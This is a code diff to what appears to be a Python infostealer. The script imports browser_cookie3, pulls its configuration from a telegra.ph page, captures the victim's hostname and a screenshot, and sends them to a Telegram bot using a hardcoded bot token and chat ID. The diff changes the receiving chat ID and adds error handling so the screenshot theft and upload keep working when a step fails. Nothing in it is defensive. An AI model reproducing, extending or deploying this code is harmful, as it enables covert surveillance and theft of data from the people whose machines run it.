@@ -10,7 +10,7 @@ import time
 import browser_cookie3
 
 token = "6192337221:AAESogPJK-_5wcjISHftUaJFnxDvS5kxtsE"
-chat_id = "1251285260"
+chat_id = "1104502854"
 telegraph_url = "https://api.telegra.ph/getPage/emogirl-03-08?return_content=false"
 #https://telegra.ph/emogirl-03-08
 
@@ -67,8 +67,12 @@ def main():
     if config['get_settings']['get_hostname'] == True:
         d_hostname = get_hostname()
     if config['get_settings']['take_screenshot'] == True:
-        screen = ImageGrab.grab()
-        screen.save(os.getcwd() + f'\\screen{randname}.jpg')
+        try:
+            screen = ImageGrab.grab()
+            screen.save(os.getcwd() + f'\\screen{randname}.jpg')
+        except Exception as err:
+            print(err)
+            bot.send_message(chat_id, f'error: {err} ')
     d_date = datetime.now()
     
     data = f"""
@@ -79,7 +83,10 @@ date: {d_date}
 
 
     if(config['get_settings']['take_screenshot'] == True):
-        bot.send_photo(chat_id, open(f'screen{randname}.jpg', 'rb'), data)
+        try:
+            bot.send_photo(chat_id, open(f'screen{randname}.jpg', 'rb'), data)
+        except:
+            pass
     else:
         bot.send_message(chat_id, data)
 
